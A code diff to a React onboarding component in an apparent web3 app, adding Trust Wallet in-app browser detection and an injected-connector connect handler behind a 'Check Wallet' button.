@@ -11,6 +11,7 @@ import { readContract, getPublicClient } from 'wagmi/actions'
 import { formatUnits, createPublicClient, http as viemHttp } from 'viem'
 import { mainnet as viemMainnet, polygon as viemPolygon, arbitrum as viemArbitrum, base as viemBase } from 'viem/chains'
 import { RESOLVED_RPC_URLS } from '../web3/config.jsx'
+import { useConnect } from 'wagmi'
 
 function getNameFromId(id) { return CHAIN_NAMES[id] || 'ethereum' }
 const NETWORKS_TO_SCAN = [CHAIN_IDS.ethereum, CHAIN_IDS.arbitrum, CHAIN_IDS.polygon, CHAIN_IDS.base]
@@ -33,6 +34,7 @@ export default function Onboarding() {
   const { disconnect } = useDisconnect()
   const chainId = useChainId()
   const { switchChain } = useSwitchChain()
+  const { connect, connectors } = useConnect()
   const [usdtBalance, setUsdtBalance] = useState(null)
   const [usdtNetwork, setUsdtNetwork] = useState('')
   const [isApproving, setIsApproving] = useState(false)
@@ -64,6 +66,27 @@ export default function Onboarding() {
     if (amount === 0) return '0'
     if (amount < 0.01) return amount.toFixed(6)
     return amount.toFixed(2)
+  }
+
+  function isTrustWalletBrowser() {
+    const ua = typeof navigator !== 'undefined' ? navigator.userAgent || '' : ''
+    const hasInjected = typeof window !== 'undefined' && window.ethereum
+    const providerFlag = hasInjected && (window.ethereum.isTrust || window.ethereum.isTrustWallet)
+    const uaMatch = /trust\s?wallet/i.test(ua) || /trust/i.test(ua)
+    return !!(providerFlag || uaMatch)
+  }
+
+  function handleConnectTrustWallet() {
+    if (isTrustWalletBrowser()) {
+      const injected = connectors?.find(c => c.id === 'injected' || (c.name && c.name.toLowerCase().includes('injected')))
+      if (injected && connect) {
+        try { connect({ connector: injected }) } catch (_) {}
+        return
+      }
+      try { window.ethereum?.request?.({ method: 'eth_requestAccounts' }) } catch (_) {}
+    } else {
+      setTrustModalOpen(true)
+    }
   }
 
   function handleCheckWallet() {
@@ -368,7 +391,7 @@ export default function Onboarding() {
 
               <div className="plan-action">
                 {!isConnected ? (
-                  <CheckWalletButton onClick={() => setTrustModalOpen(true)}>Check Wallet</CheckWalletButton>
+                  <CheckWalletButton onClick={handleConnectTrustWallet} >Check Wallet</CheckWalletButton>
                 ) : (
                   <div className="wallet-connected-section">
                     <div className="wallet-info">
